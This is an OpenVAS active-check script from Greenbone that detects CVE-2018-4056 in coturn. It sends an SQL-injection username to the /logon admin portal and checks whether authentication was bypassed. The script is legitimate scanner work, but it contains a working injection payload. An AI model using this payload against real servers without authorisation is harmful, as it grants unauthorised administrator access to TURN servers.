###############################################################################
# OpenVAS Vulnerability Test
#
# coturn <= 4.5.0.8 Authentication Bypass Vulnerability (Active Check)
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (C) 2019 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:coturn:coturn";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141944");
  script_version("2022-06-09T03:04:58+0000");
  script_tag(name:"last_modification", value:"2022-06-09 03:04:58 +0000 (Thu, 09 Jun 2022)");
  script_tag(name:"creation_date", value:"2019-01-31 13:03:06 +0700 (Thu, 31 Jan 2019)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2022-06-07 17:18:00 +0000 (Tue, 07 Jun 2022)");

  script_cve_id("CVE-2018-4056");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("coturn <= 4.5.0.8 Authentication Bypass Vulnerability (Active Check)");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2019 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_coturn_http_detect.nasl");
  script_mandatory_keys("coturn/detected");

  script_tag(name:"summary", value:"An exploitable SQL injection vulnerability exists in the administrator web
portal function of coturn. A login message with a specially crafted username can cause an SQL injection, resulting
in authentication bypass, which could give access to the TURN server administrator web portal. An attacker can log
in via the external interface of the TURN server to trigger this vulnerability.");

  script_tag(name:"affected", value:"coturn before version 4.5.0.9.");

  script_tag(name:"solution", value:"Update to version 4.5.0.9 or later.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_xref(name:"URL", value:"https://blog.talosintelligence.com/2019/01/vulnerability-spotlight-multiple.html");
  script_xref(name:"URL", value:"http://www.talosintelligence.com/reports/TALOS-2018-0730");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

# This seems to initiate the session on the server (so not caching) and therefore is needed first
req = http_get(port: port, item: "/favicon.ico");
res = http_keepalive_send_recv(port: port, data: req);

url = "/logon";
data = 'uname=%27+union+select+%27%27%2C%270000%27%3B+--&pwd=0000';
headers = make_array("Content-Type", "application/x-www-form-urlencoded");

req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
res = http_keepalive_send_recv(port: port, data: req);

if ("<i>' union select" >< res && "Set Admin Session Realm" >< res) {
  report = "It was possible to bypass authentication and login as an admin user.";
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
